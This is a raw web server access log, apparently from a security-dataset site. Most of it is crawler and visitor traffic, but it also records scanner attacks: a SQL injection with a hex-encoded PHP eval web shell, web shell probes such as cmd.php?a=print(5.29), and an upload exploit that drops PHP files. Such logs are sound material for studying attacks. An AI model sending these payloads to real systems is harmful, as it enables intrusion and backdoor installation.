180.163.220.4 - - [16/May/2019:21:47:58 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 344240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
207.46.13.242 - - [16/May/2019:21:48:54 -0700] "GET /self.logs/2015/error.log.2015-05-13.gz HTTP/1.1" 200 2322 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
221.216.200.117 - - [16/May/2019:21:53:47 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 LBBROWSER" 
120.92.102.182 - - [16/May/2019:21:56:46 -0700] "GET /4g.php?m=show&cid=2&tbname=pmw_goods%60%20SET%20attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29%20where%20classid=12%20or%20@%60'%60%20%23%20and%20@%60'%60 HTTP/1.1" 418 584 "-" "python-requests/2.21.0" 
73.37.76.88 - - [16/May/2019:21:57:44 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1" 
73.37.76.88 - - [16/May/2019:21:57:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1" 
73.37.76.88 - - [16/May/2019:21:57:45 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1" 
73.37.76.88 - - [16/May/2019:21:57:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1" 
207.46.13.242 - - [16/May/2019:22:01:25 -0700] "GET /self.logs/access.log.2017-06-26.gz HTTP/1.1" 200 46927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.98.4.34 - - [16/May/2019:22:05:25 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
14.98.4.34 - - [16/May/2019:22:05:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
14.98.4.34 - - [16/May/2019:22:05:29 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
207.46.13.242 - - [16/May/2019:22:06:22 -0700] "GET /self.logs/error.log.2017-08-05.gz HTTP/1.1" 200 977 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.103 - - [16/May/2019:22:06:35 -0700] "GET /self.logs/error.log.2018-02-09.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.60 - - [16/May/2019:22:08:56 -0700] "GET /self.logs/access.log.2017-06-03.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.98.4.34 - - [16/May/2019:22:10:37 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
14.98.4.34 - - [16/May/2019:22:10:49 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/Datasets%20Description/Network/dns.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
207.46.13.242 - - [16/May/2019:22:11:07 -0700] "GET /self.logs/error.log.2017-11-25.gz HTTP/1.1" 200 1828 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
47.92.89.183 - - [16/May/2019:22:14:26 -0700] "GET /ueditor/php/imageUp.php HTTP/1.1" 404 295 "http://www.secrepo.com/ueditor/php/imageUp.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
52.1.109.34 - - [16/May/2019:22:14:52 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "-" "Embedly +support@embed.ly" 
40.77.167.60 - - [16/May/2019:22:21:35 -0700] "GET /self.logs/2015/?C=S;O=A HTTP/1.1" 200 8283 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
47.105.193.3 - - [16/May/2019:22:21:57 -0700] "GET /ueditor/php/imageUp.php HTTP/1.1" 404 295 "http://www.secrepo.com/ueditor/php/imageUp.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
115.156.152.19 - - [16/May/2019:22:24:29 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
95.183.244.2 - - [16/May/2019:22:28:19 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
207.46.13.242 - - [16/May/2019:22:34:29 -0700] "GET /self.logs/access.log.2017-11-14.gz HTTP/1.1" 200 22990 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.60 - - [16/May/2019:22:35:00 -0700] "GET /self.logs/access.log.2019-01-11.gz HTTP/1.1" 200 26725 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
101.91.60.104 - - [16/May/2019:22:35:06 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 167280 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" 
66.249.64.47 - - [16/May/2019:22:36:12 -0700] "GET /ads.txt HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
139.129.98.166 - - [16/May/2019:22:36:36 -0700] "GET /ueditor/php/imageUp.php HTTP/1.1" 404 295 "http://www.secrepo.com/ueditor/php/imageUp.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
120.92.102.182 - - [16/May/2019:22:38:57 -0700] "GET /4g.php?m=show&cid=2&tbname=pmw_goods%60%20SET%20attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29%20where%20classid=12%20or%20@%60'%60%20%23%20and%20@%60'%60 HTTP/1.1" 418 584 "-" "python-requests/2.21.0" 
207.46.13.136 - - [16/May/2019:22:39:22 -0700] "GET /self.logs/error.log.2018-02-17.gz HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.242 - - [16/May/2019:22:46:23 -0700] "GET /self.logs/2016/error.log.2016-10-20.gz HTTP/1.1" 200 697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
171.223.42.84 - - [16/May/2019:22:49:00 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
113.171.224.176 - - [16/May/2019:22:49:12 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.242 - - [16/May/2019:22:51:02 -0700] "GET /self.logs/error.log.2019-01-24.gz HTTP/1.1" 200 2356 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.58.86.206 - - [16/May/2019:23:02:24 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [16/May/2019:23:02:25 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [16/May/2019:23:02:27 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [16/May/2019:23:02:30 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [16/May/2019:23:02:32 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
207.46.13.242 - - [16/May/2019:23:14:47 -0700] "GET /self.logs/access.log.2018-06-29.gz HTTP/1.1" 200 39779 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.73.208.93 - - [16/May/2019:23:17:17 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
223.73.208.93 - - [16/May/2019:23:17:18 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
207.46.13.99 - - [16/May/2019:23:18:10 -0700] "GET /self.logs/access.log.2019-02-13.gz HTTP/1.1" 200 25953 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.242 - - [16/May/2019:23:19:10 -0700] "GET /self.logs/access.log.2017-06-21.gz HTTP/1.1" 200 25199 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
42.51.43.140 - - [16/May/2019:23:19:58 -0700] "POST /dayrui/libraries/Chart/ofc_upload_image.php?name=test5188.php HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
42.51.43.140 - - [16/May/2019:23:19:58 -0700] "GET /dayrui/libraries/tmp-upload-images/test5188.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
157.55.39.32 - - [16/May/2019:23:23:02 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
93.67.66.173 - - [16/May/2019:23:23:45 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.102.9.139 - - [16/May/2019:23:24:31 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.141 - - [16/May/2019:23:24:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
207.46.13.136 - - [16/May/2019:23:29:56 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 18818 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/May/2019:23:32:08 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.100 - - [16/May/2019:23:32:14 -0700] "GET /self.logs/2016/error.log.2016-12-26.gz HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/May/2019:23:36:46 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
159.226.95.32 - - [16/May/2019:23:39:13 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
111.73.46.48 - - [16/May/2019:23:40:27 -0700] "HEAD //1.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:26 -0700] "HEAD //index.php HTTP/1.1" 404 320 "-" "python-requests/2.21.0" 
111.73.46.48 - - [16/May/2019:23:40:27 -0700] "HEAD //1.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:28 -0700] "HEAD //1.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:30 -0700] "HEAD //cmd.asp HTTP/1.1" 418 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:32 -0700] "HEAD //cmd.aspx HTTP/1.1" 418 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:33 -0700] "HEAD //cmd.php?a=print(5.29) HTTP/1.1" 418 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:34 -0700] "HEAD //100.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:34 -0700] "HEAD //100.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:39 -0700] "HEAD //test.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:41 -0700] "HEAD //test.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:41 -0700] "HEAD //100.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:44 -0700] "HEAD //sb.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
47.29.178.147 - - [16/May/2019:23:40:50 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
111.73.46.48 - - [16/May/2019:23:40:52 -0700] "HEAD //test.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:40:53 -0700] "HEAD //sb.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
47.29.178.147 - - [16/May/2019:23:40:53 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
111.73.46.48 - - [16/May/2019:23:41:03 -0700] "HEAD //hack.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:04 -0700] "HEAD //hack.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:09 -0700] "HEAD //sb.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:12 -0700] "HEAD //2.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:18 -0700] "HEAD //2.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:24 -0700] "HEAD //123.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:26 -0700] "HEAD //hack.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:32 -0700] "HEAD //123.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:38 -0700] "HEAD //2.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:39 -0700] "HEAD /index.aspx HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:46 -0700] "HEAD //123.php?a=print(5.29) HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
111.73.46.48 - - [16/May/2019:23:41:48 -0700] "HEAD /index.asp HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
207.46.13.136 - - [16/May/2019:23:44:23 -0700] "GET /self.logs/2016/access.log.2016-07-11.gz HTTP/1.1" 200 11525 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
86.121.118.127 - - [16/May/2019:23:45:59 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
86.121.118.127 - - [16/May/2019:23:46:00 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
86.121.118.127 - - [16/May/2019:23:46:00 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
86.121.118.127 - - [16/May/2019:23:46:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
13.66.139.0 - - [16/May/2019:23:46:21 -0700] "GET /self.logs/access.log.2018-08-01.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.192.214.215 - - [16/May/2019:23:51:04 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
14.192.214.215 - - [16/May/2019:23:51:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
113.171.224.176 - - [16/May/2019:23:51:57 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.136 - - [16/May/2019:23:56:21 -0700] "GET /self.logs/2016/error.log.2016-04-06.gz HTTP/1.1" 200 717 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.190 - - [17/May/2019:00:00:21 -0700] "GET /self.logs/2016/error.log.2016-08-15.gz HTTP/1.1" 200 684 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.44 - - [17/May/2019:00:03:15 -0700] "GET /self.logs/access.log.2018-05-03.gz HTTP/1.1" 200 43936 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.143 - - [17/May/2019:00:15:02 -0700] "GET /self.logs/2016/access.log.2016-11-20.gz HTTP/1.1" 200 7216 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.143 - - [17/May/2019:00:15:13 -0700] "GET /self.logs/2016/error.log.2016-10-02.gz HTTP/1.1" 200 1676 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.164 - - [17/May/2019:00:24:51 -0700] "GET /self.logs/2016/access.log.2016-06-19.gz HTTP/1.1" 200 5854 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
178.87.114.109 - - [17/May/2019:00:31:27 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
151.0.85.218 - - [17/May/2019:00:33:04 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
151.0.85.218 - - [17/May/2019:00:33:04 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
40.77.167.190 - - [17/May/2019:00:37:23 -0700] "GET /self.logs/access.log.2017-06-26.gz HTTP/1.1" 200 46927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.164 - - [17/May/2019:00:40:09 -0700] "GET /self.logs/2016/error.log.2016-04-18.gz HTTP/1.1" 200 893 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.143 - - [17/May/2019:00:42:15 -0700] "GET /self.logs/2016/access.log.2016-04-01.gz HTTP/1.1" 200 7671 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
182.76.175.118 - - [17/May/2019:00:42:34 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:42:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:42:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:42:36 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:43:09 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
40.77.167.143 - - [17/May/2019:00:43:12 -0700] "GET /self.logs/error.log.2018-02-02.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
182.76.175.118 - - [17/May/2019:00:43:09 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629419 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:43:07 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 33680563 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:43:39 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
182.76.175.118 - - [17/May/2019:00:44:02 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [17/May/2019:00:44:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [17/May/2019:00:44:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [17/May/2019:00:44:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [17/May/2019:00:44:07 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629419 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
42.51.43.140 - - [17/May/2019:00:45:15 -0700] "POST /dayrui/libraries/Chart/ofc_upload_image.php?name=test9859.php HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
42.51.43.140 - - [17/May/2019:00:45:18 -0700] "GET /dayrui/libraries/tmp-upload-images/test9859.php HTTP/1.1" 301 566 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
